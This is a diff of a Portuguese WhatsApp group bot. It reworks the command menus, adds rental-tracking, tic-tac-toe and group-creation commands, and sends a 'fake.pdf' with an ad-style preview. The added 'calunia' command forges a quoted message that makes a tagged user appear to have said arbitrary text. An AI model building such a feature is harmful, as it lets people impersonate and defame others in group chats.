 │➢ ${prefix}emojimix2 [ _😈_ ]
 │➢ ${prefix}reagir [ _emoji_ ]
 │➢ ${prefix}tts pt [ _txt_ ]
-│➢ ${prefix}emoji [ _emoji_ ]
-│➢ ${prefix}emoji2 [ _emoji_ ]
 │
 ├──⊰「 𝑭𝑰𝑮𝑼𝑹𝑰𝑵𝑯𝐴𝑺 」
 │
@@ -3187,24 +3661,29 @@ anyakkk = `
 ├──⊰「 𝑷𝑬𝑺𝑸𝑼𝑰𝑺𝐴/𝑫𝑶𝑾𝑵𝑳𝑶𝑨𝑫 」
 │
 │➢ ${prefix}pinterest [ _nome_ ]
+│➢ ${prefix}stickersearch [ _nome_ ]
 │➢ ${prefix}anime [ _nome_ ]
 │➢ ${prefix}wikipedia [ _pesquisa_ ]
 │➢ ${prefix}play [ _nome da msc_ ]
 │➢ ${prefix}play2 [ _nome da msc_ ]
+│➢ ${prefix}ytmp3 [ _link da msc_ ]
+│➢ ${prefix}ytmp4 [ _link da msc_ ]
 │➢ ${prefix}tiktok [ _link_ ]
-│➢ ${prefix}tiktokwm [ _link_ ]
-│➢ ${prefix}tiktokmp3 [ _link_ ]
+│➢ ${prefix}igreel [ _link_ ]
+│➢ ${prefix}igdl [ _link_ ]
+│➢ ${prefix}facebook [ _link_ ]
+│➢ ${prefix}fbmp3 [ _link_ ]
 │➢ ${prefix}metadinha
 │➢ ${prefix}nick [ _nome_ ]
 │➢ ${prefix}gimage [ _nome_ ]
-│➢ ${prefix}cantadas
-│➢ ${prefix}ddd [ _ddd_ ]
 │➢ ${prefix}lirik [ _nome da msc_ ]
 │➢ ${prefix}mediafire [ _link_ ]
+│➢ ${prefix}covid
 │
 ├──⊰「 𝑫𝑰𝑽𝑬𝑹𝑺𝐴𝑶 」
 │
-│➢ ${prefix}ttt [ _@_ ]
+│➢ ${prefix}akinator
+│➢ ${prefix}jogodaforca [ _1/0_ ]
 │➢ ${prefix}quando
 │➢ ${prefix}morte
 │➢ ${prefix}pau
@@ -3225,8 +3704,6 @@ anyakkk = `
 │➢ ${prefix}abraço [ _@_ ]
 │➢ ${prefix}beijo [ _@_ ]
 │➢ ${prefix}perfil
-│➢ ${prefix}anya [ _fale algo_ ]
-│➢ ${prefix}simih [ _opção_ ]
 │➢ ${prefix}anagrama [ _1/0_ ]
 │
 ├──⊰「 𝐴𝑳𝑻𝑬𝑹𝐴𝑫𝑶𝑹𝑬𝑺 」
@@ -3316,10 +3793,9 @@ anyakkk = `
 │➢ ${prefix}blockcmd [ _cmd_ ]
 │➢ ${prefix}unblockcmd [ _cmd_ ]
 │➢ ${prefix}listblockcmd
-│➢ ${prefix}bc 
+│➢ ${prefix}bcall
 │➢ ${prefix}chatinfo
 │➢ ${prefix}javolto [ _tempo_ ]
-│➢ ${prefix}bcgroup
 │➢ ${prefix}antipv [ _opção_ ]
 │➢ ${prefix}setexif
 │➢ ${prefix}setreply
@@ -3331,6 +3807,7 @@ anyakkk = `
 │➢ ${prefix}addrespon [ _pergunta|resposta_ ]
 │➢ ${prefix}delrespon [ _nome_ ]
 │➢ ${prefix}listrespon
+│➢ ${prefix}criargp
 │
 └──⊰ _*${nomedobot}*_`
 let buttons = [
@@ -3339,15 +3816,25 @@ let buttons = [
                     {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: { url: "./lib/anya.jpg" },
-                    caption: anyakkk,
-                    footer: `${watermark}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            
+                   // document: fs.readFileSync(`./lib/tes.xlsx`),
+                    document: fs.readFileSync('./lib/fake.pdf'),
+fileName : `Olá ${pushname}`,
+  caption: anyakkk,
+  footer: watermark,
+  buttons: buttons,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: `${nomedobot}`,
+  body: 'Me siga no Instagram', 
+  showAdAttribution: true,
+  thumbnail: img,
+  mediaType: 2,
+  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
+  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
+  }}
+  }
+ anya.sendMessage(m.chat, buttonMessage, {quoted: m})
+  }           
             break       
             case 'menugp': {
             
@@ -3380,6 +3867,10 @@ loune = `
 │➢ ${prefix}gruposetting
 │➢ ${prefix}autoreact [ _opção_ ]
 │➢ ${prefix}convite [ _link de gp_ ]
+│➢ ${prefix}dontback
+│➢ ${prefix}dbackadd [ _55xxxxx_ ]
+│➢ ${prefix}dbackrm [ _55xxxxx_ ]
+│➢ ${prefix}gpinfo
 │
 ├──⊰「 𝑨𝑵𝑻𝑰𝑺 」
 │
@@ -3398,14 +3889,24 @@ loune = `
                     {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: { url: "./lib/anya.jpg" },
-                    caption: loune,
-                    footer: `${watermark}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }            
+                    document: fs.readFileSync('./lib/fake.pdf'),
+fileName : `Olá ${pushname}`,
+caption: loune,
+footer: watermark,
+  buttons: buttons,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: `${nomedobot}`,
+  body: 'Me siga no Instagram', 
+  showAdAttribution: true,
+  thumbnail: img,
+  mediaType: 2,
+  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
+  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
+  }}
+  }
+ anya.sendMessage(m.chat, buttonMessage, {quoted: m})
+  }           
             break
 case 'menuconverter': {
 
@@ -3413,7 +3914,6 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
 alone22 = `
 ┌──⊰「 𝑪𝑶𝑵𝑽𝑬𝑹𝑻𝑬𝑹 」
 │
-│➢ ${prefix}rename [ _nome1|nome2_ ]
 │➢ ${prefix}toimage
 │➢ ${prefix}sticker
 │➢ ${prefix}togif
@@ -3426,8 +3926,6 @@ alone22 = `
 │➢ ${prefix}emojimix2 [ _😈_ ]
 │➢ ${prefix}reagir [ _emoji_ ]
 │➢ ${prefix}tts pt [ _txt_ ]
-│➢ ${prefix}emoji [ _emoji_ ]
-│➢ ${prefix}emoji2 [ _emoji_ ]
 │
 └──⊰ _*${nomedobot}*_`
 let buttons = [
@@ -3436,14 +3934,24 @@ let buttons = [
                     {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: { url: "./lib/anya.jpg" },
-                    caption: alone22,
-                    footer: `${watermark}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }            
+                    document: fs.readFileSync('./lib/fake.pdf'),
+fileName : `Olá ${pushname}`,
+caption: alone22,
+footer: watermark,
+  buttons: buttons,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: `${nomedobot}`,
+  body: 'Me siga no Instagram', 
+  showAdAttribution: true,
+  thumbnail: img,
+  mediaType: 2,
+  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
+  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
+  }}
+  }
+ anya.sendMessage(m.chat, buttonMessage, {quoted: m})
+  }           
 break
 case 'menupesq': {
 
@@ -3453,19 +3961,23 @@ alone33 = `
 │
 │➢ ${prefix}pinterest [ _nome_ ]
 │➢ ${prefix}anime [ _nome_ ]
+│➢ ${prefix}happymod [ _nome_ ]
 │➢ ${prefix}wikipedia [ _pesquisa_ ]
 │➢ ${prefix}play [ _nome da msc_ ]
 │➢ ${prefix}play2 [ _nome da msc_ ]
+│➢ ${prefix}ytmp3 [ _link da msc_ ]
+│➢ ${prefix}ytmp4 [ _link da msc_ ]
 │➢ ${prefix}tiktok [ _link_ ]
-│➢ ${prefix}tiktokwm [ _link_ ]
-│➢ ${prefix}tiktokmp3 [ _link_ ]
+│➢ ${prefix}igreel [ _link_ ]
+│➢ ${prefix}igdl [ _link_ ]
+│➢ ${prefix}facebook [ _link_ ]
+│➢ ${prefix}fbmp3 [ _link_ ]
 │➢ ${prefix}metadinha
 │➢ ${prefix}nick [ _nome_ ]
 │➢ ${prefix}gimage [ _nome_ ]
-│➢ ${prefix}cantadas
-│➢ ${prefix}ddd [ _ddd_ ]
 │➢ ${prefix}lirik [ _nome da msc_ ]
 │➢ ${prefix}mediafire [ _link_ ]
+│➢ ${prefix}covid 
 │
 └──⊰ _*${nomedobot}*_`
 let buttons = [
@@ -3474,14 +3986,24 @@ let buttons = [
                     {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: { url: "./lib/anya.jpg" },
+                    document: fs.readFileSync('./lib/fake.pdf'),
+fileName : `Olá ${pushname}`,
                     caption: alone33,
-                    footer: `${watermark}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }           
+                    footer: watermark,
+  buttons: buttons,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: `${nomedobot}`,
+  body: 'Me siga no Instagram', 
+  showAdAttribution: true,
+  thumbnail: img,
+  mediaType: 2,
+  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
+  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
+  }}
+  }
+ anya.sendMessage(m.chat, buttonMessage, {quoted: m})
+  }           
 break
 case 'menufun': {
 
@@ -3489,7 +4011,8 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
 alone4 = `
 ┌──⊰「 𝑫𝑰𝑽𝑬𝑹𝑺𝐴𝑶 」
 │
-│➢ ${prefix}ttt [ _@_ ]
+│➢ ${prefix}akinator
+│➢ ${prefix}jogodaforca [ _1/0_ ]
 │➢ ${prefix}quando
 │➢ ${prefix}morte
 │➢ ${prefix}pau
@@ -3510,8 +4033,6 @@ alone4 = `
 │➢ ${prefix}abraço [ _@_ ]
 │➢ ${prefix}beijo [ _@_ ]
 │➢ ${prefix}perfil
-│➢ ${prefix}anya [ _fale algo_ ]
-│➢ ${prefix}simih [ _opção_ ]
 │➢ ${prefix}anagrama [ _1/0_ ]
 │
 └──⊰ _*${nomedobot}*_`
@@ -3521,14 +4042,24 @@ let buttons = [
                     {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: { url: "./lib/anya.jpg" },
+                    document: fs.readFileSync('./lib/fake.pdf'),
+fileName : `Olá ${pushname}`,
                     caption: alone4,
-                    footer: `${watermark}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }          
+                    footer: watermark,
+  buttons: buttons,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: `${nomedobot}`,
+  body: 'Me siga no Instagram', 
+  showAdAttribution: true,
+  thumbnail: img,
+  mediaType: 2,
+  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
+  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
+  }}
+  }
+ anya.sendMessage(m.chat, buttonMessage, {quoted: m})
+  }           
 break
 case 'alteradores': { 
 
@@ -3556,14 +4087,24 @@ let buttons = [
                     {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: { url: "./lib/anya.jpg" },
+                    document: fs.readFileSync('./lib/fake.pdf'),
+fileName : `Olá ${pushname}`,
                     caption: alone5,
-                    footer: `${watermark}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }          
+                    footer: watermark,
+  buttons: buttons,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: `${nomedobot}`,
+  body: 'Me siga no Instagram', 
+  showAdAttribution: true,
+  thumbnail: img,
+  mediaType: 2,
+  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
+  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
+  }}
+  }
+ anya.sendMessage(m.chat, buttonMessage, {quoted: m})
+  }           
 break
 case '+18': {
 
@@ -3599,14 +4140,24 @@ let buttons = [
                     {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: { url: "./lib/anya.jpg" },
+                    document: fs.readFileSync('./lib/fake.pdf'),
+fileName : `Olá ${pushname}`,
                     caption: alone6,
-                    footer: `${watermark}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }          
+                    footer: watermark,
+  buttons: buttons,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: `${nomedobot}`,
+  body: 'Me siga no Instagram', 
+  showAdAttribution: true,
+  thumbnail: img,
+  mediaType: 2,
+  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
+  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
+  }}
+  }
+ anya.sendMessage(m.chat, buttonMessage, {quoted: m})
+  }           
 break
 case 'menulogo': {
 alone9 = `
@@ -3641,53 +4192,24 @@ let buttons = [
                     {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: { url: "./lib/anya.jpg" },
+                    document: fs.readFileSync('./lib/fake.pdf'),
+fileName : `Olá ${pushname}`,
                     caption: alone9,
-                    footer: `${watermark}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
-}
-break
-case 'menuefeito': {
-alone10 = `
-┌──⊰「 𝑬𝑭𝑬𝑰𝑻𝑶 𝑰𝑴𝑮 」
-│
-│➢ ${prefix}jail
-│➢ ${prefix}wanted 
-│➢ ${prefix}ytcomment
-│➢ ${prefix}fotojatoh
-│➢ ${prefix}shit
-│➢ ${prefix}beautiful
-│➢ ${prefix}pixelate
-│➢ ${prefix}blur
-│➢ ${prefix}triggeredwebp
-│➢ ${prefix}imagesketch
-│➢ ${prefix}rip
-│➢ ${prefix}dell
-│➢ ${prefix}invert
-│
-└──⊰ _*${nomedobot}*_`
-let buttons = [
-                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
-                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
-                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: "./lib/anya.jpg" },
-                    caption: alone10,
-                    footer: `${watermark}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
-}
-break
-case 'ta':
-const jidny = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender ? m.sender : false
-stats = jsonformat(await anya.fetchStatus(jidny))
-anya.sendMessage(m.chat, {text: stats.status})
+                    footer: watermark,
+  buttons: buttons,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: `${nomedobot}`,
+  body: 'Me siga no Instagram', 
+  showAdAttribution: true,
+  thumbnail: img,
+  mediaType: 2,
+  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
+  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
+  }}
+  }
+ anya.sendMessage(m.chat, buttonMessage, {quoted: m})
+  }           
 break
 case 'menucriador': {
 
@@ -3725,14 +4247,65 @@ let buttons = [
                     {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                 ]
                 let buttonMessage = {
-                    image: { url: "./lib/anya.jpg" },
-                    caption: alone7,
-                    footer: `${watermark}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }          
+                    document: fs.readFileSync('./lib/fake.pdf'),
+fileName : `Olá ${pushname}`,
+caption: alone7,
+footer: watermark,
+  buttons: buttons,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+  title: `${nomedobot}`,
+  body: 'Me siga no Instagram', 
+  showAdAttribution: true,
+  thumbnail: img,
+  mediaType: 2,
+  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
+  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
+  }}
+  }
+ anya.sendMessage(m.chat, buttonMessage, {quoted: m})
+  }           
+break
+case 'rentbot':
+if (!q) return m.reply(`Use :\n*${prefix}sewa* add/del tempo`)
+if (args[0] === 'add'){
+_sewa.addSewaGroup(from, args[1], sewa)
+m.reply(`Sucesso`)
+} else if (args[0].toLowerCase() === 'del'){
+sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
+fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
+m.reply(mess.success)
+} else {
+m.reply(`Use :\n*${prefix}sewa* add/del tempo`)}
+break
+case 'rentlist': 
+case 'rentallist':
+let txtnyee = `Lista de Locação\nQuantia : ${sewa.length}\n\n`
+for (let i of sewa){
+var cekvippsewa = ms(i.expired - Date.now())
+txtnyee += `*ID :* ${i.id} \n*Expirar :* ${cekvippsewa.days} dias ${cekvippsewa.hours} horas ${cekvippsewa.minutes} minutos ${cekvipp.seconds} segundos\n\n`
+}
+m.reply(txtnyee)
+break
+case 'ceksewa': 
+if (!m.isGroup) return m.reply(mess.group)
+if (!isSewa) return m.reply(`Este grupo não está listado na lista Sewabot. Digite ${prefix}sewabot para mais informações`)
+function kyun(seconds){
+  function pad(s){
+    return (s < 10 ? '0' : '') + s;
+  }
+var days = Math.floor(seconds / (60*60) / 24);
+var hours = days === 0 ? Math.floor(seconds / (60*60)) : Math.floor(seconds / (60*60) - (24*days));  
+var minutes = Math.floor(seconds % (60*60) / 60);
+  var seconds = Math.floor(seconds % 60);
+
+
+  return `「 *VALIDADE DO ALUGUEL* 」
+
+➸ ID: ${from}
+➸ Expira daqui: ${pad(days)} dia(s) ${pad(hours)} hora(s) ${pad(minutes)} minuto(s) ${pad(seconds)} segundo(s)`
+}
+m.reply(kyun((_sewa.getSewaExpired(from, sewa)-Date.now())/1000))
 break
 case 'afk': {
 
@@ -3780,16 +4353,6 @@ setTimeout(() => {
 anya.groupSettingUpdate(m.chat, 'not_announcement')
 }, timer)
 break
-case 'limituser': case 'userlimit': case 'limit':
-          
-            {      
-               let txt = `「 *All User Limit* 」\n\n`
-                 for (let i of _limit){
-                 txt += ` *User ID :* @${i.id.split("@")[0]}\n➸ *Limit* : ${i.limit}\n`
-                 }
-                m.reply(txt)       
-              }
-             break
 case 'bukatime':
 case 'closetime':
 case 'fechargp': 
@@ -3808,10 +4371,29 @@ setTimeout( () => {
 anya.groupSettingUpdate(m.chat, 'announcement')
 }, timer)
 break
+case `calunia`:
+//addFilter(from) 
+if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
+k = `${body.slice(10)}`
+txt1 = k.split("/")[0];
+txt2 = k.split("/")[1];
+txt3 = k.split("/")[2];
+if(!k.includes("/")) return m.reply(`Cade a /\nExemplo: ${prefix + command} @marca-a-pessoa/Fala algo como fosse ele/Reação : nossaa..`)
+ anya.sendMessage(m.chat, { text: `${txt3}`}, {quoted:{    key: {fromMe: false,participant: `${txt1}@s.whatsapp.net`,},message: { "extendedTextMessage": {"text": `${txt2}`,"title": `Hmm`}}}})
+ break
+case 'attp':
+gehdhe = await getBuffer(`https://api.xteam.xyz/${command}?file&text=${encodeURI(q)}`)
+anya.sendMessage(m.chat, { sticker: gehdhe}, {quoted:m})
+break
+case 'mudarfoto': {
+let media1 = await anya.downloadAndSaveMediaMessage(quoted)
+await anya.updateProfilePicture(m.chat, { url: media1 }).catch((err) => fs.unlinkSync(media))
+}
+break
 case 'chatinfo': case 'infochat': {
              
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-                if (!isCreator) return m.reply(mess.dono)
+                if (!isCreator) return m.reply(mess.owner)
                 if (!m.quoted) return m.reply('marque a msg')
                 let msg = await m.getQuotedObj()
                 if (!m.quoted.isBaileys) return m.reply('A mensagem não foi enviada por mim❗')
@@ -3821,7 +4403,7 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
                     let unread = i.receiptTimestamp
                     let waktu = read ? read : unread
                     teks += ` @${i.userJid.split(`@`)[0]}\n`
-                    teks += ` ┗━ *Tempo :* ${moment(waktu * 1000).format(`DD/MM/YY HH:mm:ss`)}  *Status :* ${read ? `Read` : `Sent`}\n\n`
+                    teks += ` ┗━ *Tempo :* ${moment(waktu * 1000).format(`DD/MM/YY HH:mm:ss`)}  *Status :* ${read ? `olhou a msg` : `não olhou a msg`}\n\n`
                 }
                 anya.sendTextWithMentions(m.chat, teks, m)
             }
@@ -3889,31 +4471,20 @@ case 'linkgroup': case 'linkgc': case 'linkgp': case 'linkgrupo': case 'grupolin
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                 if (!m.isGroup) return m.reply(mess.group)
                 let response = await anya.groupInviteCode(m.chat)
-               anya.sendMessage(m.chat, {text:`https://chat.whatsapp.com/${response}\n\nLink Do grupo : ${groupMetadata.subject}`, "contextInfo": {
-mimetype: "image/jpeg",
-text: `${nomedodono}`,
-"externalAdReply": {
-showAdAttribution: true,
-"title": `${nomedobot}`,
-"body": `${watermark}`,
-"previewType": "PHOTO",
-"thumbnailUrl": img,
-"thumbnail": img,
-"sourceUrl": `wa.me/+558898204406`
-}}}, { quoted: m, detectLink: true })
+               anya.sendMessage(m.chat, {text:`https://chat.whatsapp.com/${response}\n\nLink Do grupo : ${groupMetadata.subject}`})
                  }
             break
-case 'creategc': {
+case 'criargp': {
 if (!isCreator) return m.reply(mess.owner)
-if (!args.join(" ")) return m.reply(`Penggunaan ${prefix+command} namagroup`)
+if (!args.join(" ")) return m.reply(`use ${prefix+command} nome do gp`)
 try {
 let cret = await anya.groupCreate(args.join(" "), [])
 let response = await anya.groupInviteCode(cret.id)
-teks = `     「 Group Create Fitur 」
+teks = `     「 Grupo Criado! 」
 
 ▸ Nome : ${cret.subject}
 ▸ Proprietário : @${cret.owner.split("@")[0]}
-▸ Criação : ${moment(cret.creation * 1000).tz("America/Sao_Paulo").format("DD/MM/YYYY HH:mm:ss")} WIB
+▸ Criação : ${moment(cret.creation * 1000).tz("America/Sao_Paulo").format("DD/MM/YYYY HH:mm:ss")}
 
 link do gp: [https://chat.whatsapp.com/${response}]
        `
@@ -3923,6 +4494,41 @@ m.reply("Error!")
 }
 }
 break
+ case "tictactoe":
+      case "jogodavelha":
+        if (!m.isGroup) return m.reply(mess.group);
+        if (args.length < 1) return m.reply('Marque *"@"* o seu oponente ⚔️');
+        if (isTTT)
+          return m.reply("Há um jogo neste grupo, por favor aguarde até o jogo acabar ⏰");
+        if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null)
+          return m.reply('Marque *"@"* o seu oponente ⚔️!')
+        ment = m.message.extendedTextMessage.contextInfo.mentionedJid;
+        player1 = m.sender;
+        player2 = ment[0];
+        angka = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"];
+        id = m.chat;
+        gilir = player2;
+        ky_ttt.push({ player1, player2, id, angka, gilir });
+        esperandoo = `*🎳 Iniciando O Jogo Da Velha 🎲*
+
+[@${player2.split("@")[0]}] Você está sendo desafiado🔥
+Use Y/N Para aceitar, ou correr do desafio...
+
+Nota: use ${prefix}delttt , Para resetar o jogo da velha no grupo, caso o player não responder...!`
+        var botão = [
+                        { buttonId: `!Y`, buttonText: { displayText: `ACEITAR` }, type: 1 },
+                        { buttonId: `!N`, buttonText: { displayText: `RECUSAR` }, type: 1 },                       
+                    ]
+                    await anya.sendButtonText(m.chat, botão, esperandoo, `${watermark}`, m)
+        break
+      case "delttt":
+      case "delttc":
+        if (!m.isGroup) return m.reply(mess.group);
+        if (!isTTT) return m.reply("Não há jogos neste grupo");
+        naa = ky_ttt.filter((toek) => !toek.id.includes(m.chat));
+        ky_ttt = naa;
+        m.reply("Game da velha foi resetado neste grupo ☕");
+        break;
 case 'ping': case 'botstatus': case 'statusbot': case 'status': {
             	    
 		    	 	
@@ -3965,9 +4571,7 @@ case 'vote': {
 ┃ Total: ${vote[m.chat][2].length}
 ┃
 ┃ 
-┗━━━━
-
-*${prefix}deletevote* - para deletar voto`
+┗━━━━`
 let buttonsVote = [
   {buttonId: `${prefix}upvote`, buttonText: {displayText: 'VOTAR'}, type: 1},
               {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTAR'}, type: 1},
@@ -3976,7 +4580,7 @@ let buttonsVote = [
 
             let buttonMessageVote = {
                 text: teks_vote,
-                footer: anya.user.name,
+                footer: `${watermark}`,
                 buttons: buttonsVote,
                 headerType: 1
             }
@@ -4009,9 +4613,7 @@ ${vote[m.chat][1].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 ┃ Total: ${vote[m.chat][2].length}
 ${vote[m.chat][2].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 ┃ 
-┗━━━━
-
-*${prefix}deletevote* - para deletar voto`
+┗━━━━`
             let buttonsUpvote = [
               {buttonId: `${prefix}upvote`, buttonText: {displayText: 'VOTAR'}, type: 1},
               {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTAR'}, type: 1},
@@ -4020,7 +4622,7 @@ ${vote[m.chat][2].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
             let buttonMessageUpvote = {
                 text: teks_vote,
-                footer: anya.user.name,
+                footer: `${watermark}`,
                 buttons: buttonsUpvote,
                 headerType: 1,
                 mentions: menvote
@@ -4053,9 +4655,7 @@ ${vote[m.chat][1].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 ┃ Total: ${vote[m.chat][2].length}
 ${vote[m.chat][2].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 ┃ 
-┗━━━━
-
-*${prefix}deletevote* - para deletar voto`
+┗━━━━`
             let buttonsDevote = [
               {buttonId: `${prefix}upvote`, buttonText: {displayText: 'VOTAR'}, type: 1},
               {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTAR'}, type: 1},
@@ -4064,7 +4664,7 @@ ${vote[m.chat][2].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
             let buttonMessageDevote = {
                 text: teks_vote,
-                footer: anya.user.name,
+                footer: `${watermark}`,
                 buttons: buttonsDevote,
                 headerType: 1,
                 mentions: menvote
@@ -4092,13 +4692,7 @@ ${vote[m.chat][1].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 ┃ Total: ${devote.length}
 ${vote[m.chat][2].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 ┃ 
-┗━━━━
-
-*${prefix}deletevote* - para deletar voto
-
-
-©${anya.user.id}
-`
+┗━━━━`
 anya.sendTextWithMentions(m.chat, teks_vote, m)
 break
 		case 'deletevote': case'delvote': case 'hapusvote': {
@@ -4118,14 +4712,14 @@ var alone3 = `${isAntiFa ? 'Ativado✅':'Desativado❌'}`
                         if (isAntiFa) return m.reply('❎O recurso ANTIFAKE já está ativado no grupo❎')
                         antifake.push(from)
                         fs.writeFileSync('./database/antis/antifake.json', JSON.stringify(antifake))
-                        m.reply('✅O recurso ANTIFAKE foi ativado✅')
+                        m.reply(`*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Fake*\n*🎚️Opção: Ativada*\n*📊 Status: Sucesso*`)
                         var groupe = await anya.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
